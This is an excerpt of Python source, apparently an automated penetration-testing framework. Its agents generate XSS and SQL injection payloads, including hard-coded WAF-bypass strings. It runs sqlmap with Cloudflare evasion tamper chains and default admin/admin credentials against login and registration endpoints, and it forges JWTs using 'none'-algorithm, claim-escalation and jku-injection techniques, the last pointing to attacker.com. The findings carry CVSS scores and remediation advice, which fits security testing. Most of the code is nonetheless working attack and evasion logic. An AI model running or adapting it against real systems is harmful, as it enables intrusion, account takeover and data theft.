...
class XSSAgent(SwarmAgent):
    ...
    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
        ...
        # WAF bypass XSS hypotheses — when Foundation pre-generated bypass payloads
        waf_vendor     = context.get("waf_vendor", "")
        waf_bypass_xss = context.get("waf_bypass_payloads", {}).get("xss", [])
        if waf_bypass_xss:
            logger.info("[XSSAgent] WAF bypass mode: vendor=%s, %d bypass payloads",
                        waf_vendor, len(waf_bypass_xss))
            for ep in endpoints[:15]:
                ep_params = params_map.get(ep, ["q", "search", "input", "name"])
                for param in ep_params[:3]:
                    for bp in waf_bypass_xss[:8]:
                        hypotheses.append(Hypothesis(
                            hypothesis_id = uuid.uuid4().hex[:8],
                            agent_type    = self.agent_type,
                            target_node   = ep,
                            attack_vector = "xss_waf_bypass",
                            confidence    = self.memory.rate("xss_waf_bypass", 0.52),
                            payload       = bp,
                            context       = {"param": param, "endpoint": ep,
                                             "waf_vendor": waf_vendor, "bypass": True},
                            reasoning     = f"WAF bypass XSS ({waf_vendor}): {bp[:50]}",
                            priority      = 0.70,
                        ))

        hypotheses.sort(key=lambda h: h.priority, reverse=True)
        return hypotheses[:100]  # raised cap for bypass variants
...
class SQLiAgent(SwarmAgent):
    ...
    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
        hypotheses: List[Hypothesis] = []
        # Pull WAF bypass payloads injected by FoundationMission Step 4
        waf_vendor      = context.get("waf_vendor", "")
        waf_bypass_sqli = context.get("waf_bypass_payloads", {}).get("sqli", [])
        using_bypass    = bool(waf_bypass_sqli)
        if using_bypass:
            logger.info("[SQLiAgent] WAF bypass mode: vendor=%s, %d bypass payloads",
                        waf_vendor, len(waf_bypass_sqli))
        endpoints  = context.get("endpoints", [target])
        params_map = context.get("parameters", {})
        ...
        # WAF bypass hypotheses — added when Foundation detected a WAF and pre-generated bypass payloads
        # Each bypass payload gets a higher priority (0.72) than standard payloads
        # so agents test them first against WAF-protected targets.
        if using_bypass:
            endpoints_for_bypass = context.get("endpoints", [target])
            params_map_bypass    = context.get("parameters", {})
            _DEFAULT_BYPASS_PARAMS = ["username", "password", "email", "id", "q", "search"]
            for ep in endpoints_for_bypass[:15]:
                ep_params = params_map_bypass.get(ep, _DEFAULT_BYPASS_PARAMS)
                for param in ep_params[:4]:
                    # LLM-generated bypass payloads (AdversarialWAFEngine self-play output)
                    for bp in waf_bypass_sqli[:10]:
                        hypotheses.append(Hypothesis(
                            hypothesis_id = uuid.uuid4().hex[:8],
                            agent_type    = self.agent_type,
                            target_node   = ep,
                            attack_vector = "sqli_waf_bypass",
                            confidence    = self.memory.rate("sqli_waf_bypass", 0.55),
                            payload       = bp,
                            context       = {"param": param, "endpoint": ep,
                                             "waf_vendor": waf_vendor, "bypass": True},
                            reasoning     = f"WAF bypass payload ({waf_vendor}): {bp[:50]}",
                            priority      = 0.72,
                        ))
                    # Static comment/encoding bypass payloads (known Cloudflare bypasses)
                    for sb in ["/**/OR/**/1=1--", "' /*!OR*/ '1'='1", "admin'/*",
                               "1;SELECT%09*%09FROM%09users--", "' OR 1=1 LIMIT 1-- -",
                               "' OR/**/ '1'='1'--"]:
                        hypotheses.append(Hypothesis(
                            hypothesis_id = uuid.uuid4().hex[:8],
                            agent_type    = self.agent_type,
                            target_node   = ep,
                            attack_vector = "sqli_waf_bypass_static",
                            confidence    = 0.50,
                            payload       = sb,
                            context       = {"param": param, "endpoint": ep,
                                             "waf_vendor": waf_vendor, "bypass": True},
                            reasoning     = f"Static WAF bypass evasion ({waf_vendor}): {sb[:40]}",
                            priority      = 0.68,
                        ))

        hypotheses.sort(key=lambda h: h.priority, reverse=True)
        # Raised cap: bypass hypotheses add up to ~100 additional per endpoint set
        return hypotheses[:120]
    ...
    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
        findings: List[AgentFinding] = []
        seen_params: set = set()
        sqlmap_tested: set = set()
        MAX_SQLMAP_CALLS = 15   # raised cap: login forms + URL params both need coverage

        # ── Direct sqlmap on known login/auth/form endpoints ─────────────────
        # These endpoints don't appear in URL params (they're POST-only forms)
        # so they never reach the hypothesis loop unless we add them explicitly.
        waf_vendor   = context.get("waf_vendor", "") or ""
        waf_detected = bool(context.get("waf_vendor") or context.get("waf_profile") or context.get("waf"))
        sqli_level   = 4 if waf_detected else 2
        sqli_risk    = 2 if waf_detected else 1
        sqli_tamper  = (
            "between,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,"
            "multiplespaces,randomcase,space2comment,space2morehash,unmagicquotes"
            if "cloudflare" in waf_vendor.lower() else
            ("space2comment,between,randomcase,multiplespaces" if waf_detected else None)
        )

        # Collect all reachable endpoints from context + known patterns
        all_endpoints = list(context.get("endpoints", [target]))
        base = target.rstrip("/")

        # Known POST-only auth form endpoints — always test these explicitly
        _AUTH_FORM_TARGETS = [
            (f"{base}/login",           "username=admin&password=admin",   ["username", "password"]),
            (f"{base}/api/login",       "username=admin&password=admin",   ["username", "password"]),
            (f"{base}/api/v1/login",    "username=admin&password=admin",   ["username", "password"]),
            (f"{base}/api/v2/login",    "username=admin&password=admin",   ["username", "password"]),
            (f"{base}/signin",          "email=test@test.com&password=x",  ["email", "password"]),
            (f"{base}/api/auth/login",  "username=admin&password=admin",   ["username", "password"]),
            (f"{base}/forgot-password", "email=test@test.com",             ["email"]),
            (f"{base}/register",        "username=x&email=x@x.com&password=x", ["username", "email"]),
        ]
        # Also add any login-looking endpoints discovered in recon
        for ep in all_endpoints:
            if any(k in ep.lower() for k in ['/login','/signin','/auth','/register','/forgot']) \
               and ep not in [t[0] for t in _AUTH_FORM_TARGETS]:
                _AUTH_FORM_TARGETS.append((ep, "username=admin&password=test", ["username", "password"]))

        for form_url, form_data, form_params in _AUTH_FORM_TARGETS:
            if self._stop_event.is_set():
                break
            if len(sqlmap_tested) >= MAX_SQLMAP_CALLS:
                break
            for form_param in form_params:
                pk = f"{form_url}:{form_param}"
                if pk in sqlmap_tested:
                    continue
                sqlmap_tested.add(pk)
                logger.info("[%s] sqlmap POST form: %s param=%s tamper=%s",
                            self.name, form_url, form_param, sqli_tamper or "none")
                try:
                    ...
                    raw   = str(result.get("raw", ""))
                    is_vuln = rdata.get("is_vulnerable", False) if isinstance(rdata, dict) else False
                    vuln_params = rdata.get("vulnerable_parameters", []) if isinstance(rdata, dict) else []
                    inj_types   = rdata.get("injection_types", []) if isinstance(rdata, dict) else []
                    if is_vuln and vuln_params:
                        findings.append(self._finding(
                            target         = form_url,
                            vuln_type      = "sqli_confirmed",
                            severity       = "critical",
                            title          = f"SQL Injection (sqlmap confirmed) — POST param: {vuln_params[0]}",
                            description    = (f"sqlmap confirmed SQL injection on POST parameter '{vuln_params[0]}' "
                                             f"at {form_url}. Injection type: {', '.join(inj_types)}."),
                            payload        = form_data,
                            evidence       = f"Vulnerable params: {vuln_params}, types: {inj_types}",
                            cvss           = 9.8,
                            confidence     = 0.95,
                            reproduced     = True,
                            chain_potential= ["sqli_to_auth_bypass", "sqli_to_data_exfiltration", "sqli_to_rce"],
                            remediation    = "Use parameterised queries / prepared statements exclusively.",
                        ))
                        logger.info("[%s] sqlmap FOUND SQLi: %s param=%s", self.name, form_url, vuln_params[0])
                    # Also check raw output for partial SQLi indicators
                    elif any(sig in raw.lower() for sig in ["injectable", "sql injection", "might be injectable"]):
                        findings.append(self._finding(
                            target         = form_url,
                            vuln_type      = "sqli_potential",
                            severity       = "high",
                            title          = f"Potential SQL Injection — POST: {form_param} at {form_url}",
                            description    = "sqlmap reported potential injection but could not fully confirm.",
                            payload        = form_data,
                            evidence       = raw[:500],
                            cvss           = 7.5,
                            confidence     = 0.65,
                            reproduced     = False,
                            chain_potential= ["sqli_to_auth_bypass"],
                            remediation    = "Review parameterised queries; manual verification recommended.",
                        ))
                except Exception as _se:
                    logger.debug("[%s] sqlmap form test error: %s", self.name, _se)
        ...
        for h in hypotheses:
            ...
            try:
                ...
                # Fix: check BOTH the old keys and the new waf_vendor key from FoundationMission
                waf_vendor   = context.get("waf_vendor", "") or ""
                waf_detected = bool(
                    context.get("waf_profile") or context.get("waf")
                    or waf_vendor  # NEW: also check waf_vendor set by FoundationMission Step 4
                )
                sqli_level  = 4 if waf_detected else 2   # higher level = more tests
                sqli_risk   = 2 if waf_detected else 1
                # Cloudflare-specific tamper chain vs generic
                if waf_detected and "cloudflare" in waf_vendor.lower():
                    sqli_tamper = (
                        "between,charunicodeencode,equaltolike,greatest,"
                        "ifnull2ifisnull,multiplespaces,randomcase,"
                        "space2comment,space2morehash,unmagicquotes"
                    )
                elif waf_detected:
                    sqli_tamper = "space2comment,between,randomcase,multiplespaces"
                else:
                    sqli_tamper = None

                # Determine POST data if this is a form endpoint
                # Check if endpoint looks like a login/auth POST target
                is_post_form = any(k in h.target_node.lower() for k in
                                   ['/login', '/signin', '/auth', '/register',
                                    '/forgot', '/reset', '/api/login', '/api/auth',
                                    '/api/v', '/account'])
                post_data = f"username=test&password=test&{param}=1" if is_post_form else ""

                logger.info("[%s] sqlmap: %s param=%s waf=%s level=%d tamper=%s data=%s",
                            self.name, h.target_node, param,
                            waf_vendor or "none", sqli_level,
                            sqli_tamper or "none",
                ...
                result = await self._tool("sqlmap",
                    ...
                    level=sqli_level, risk=sqli_risk,
                    tamper=sqli_tamper,
                    waf_vendor=waf_vendor,   # pass to run_sqlmap for --random-agent etc
                    timeout=90,
                )
        ...
        for token in jwt_tokens[:5]:
            ...
            for alg_var in self._JWT_NONE_VARIANTS:
                ...
                if forged:
                    hypotheses.append(Hypothesis(
                        ...
                        context       = {"alg_variant": alg_var,
                                         "header": header, "payload_claims": payload,
                                         "token_iss": header.get("iss", ""), "token_alg": alg_var},
            ...
            if forged_claims:
                hypotheses.append(Hypothesis(
                    ...
                    context       = {"claim_changes": escalation_claims,
            ...
            if jku_token:
                hypotheses.append(Hypothesis(
                    ...
                    payload       = jku_token,
                    context       = {"jku": "https://attacker.com/.well-known/jwks.json"},
                ...
                for ep in protected_eps[:3]:
                    ...
                    if h.attack_vector == "jwt_none_alg":
                        ...
                        if (http_status == 200 or jwt_tool_vuln or
                            ...
                            findings.append(self._finding(
                                target         = ep,
                                vuln_type      = "jwt_kid_injection",  # canonical name aligned to JWTVulnerabilityScanner
                                severity       = "critical",
                        ...
                        if http_status == 200 or jwt_tool_vuln:
                            # Align vuln_type strings to JWTVulnerabilityScanner canonical names
                            # so the pipeline dedup fingerprint collapses duplicates correctly
                            _vt_map = {
                                "jwt_rs256_hs256":    "jwt_algorithm_confusion",
                                "jwt_jku_inject":     "jwt_jwks_uri_confusion",
                                "jwt_expiry_bypass":  "jwt_expiry_manipulation",
                            }
                            _canonical_vt = _vt_map.get(h.attack_vector, h.attack_vector)
                            findings.append(self._finding(
                                target         = ep,
                                vuln_type      = _canonical_vt,
                                severity       = "critical",
                                title          = f"JWT Vulnerability: {_canonical_vt.replace('_', ' ').title()}",
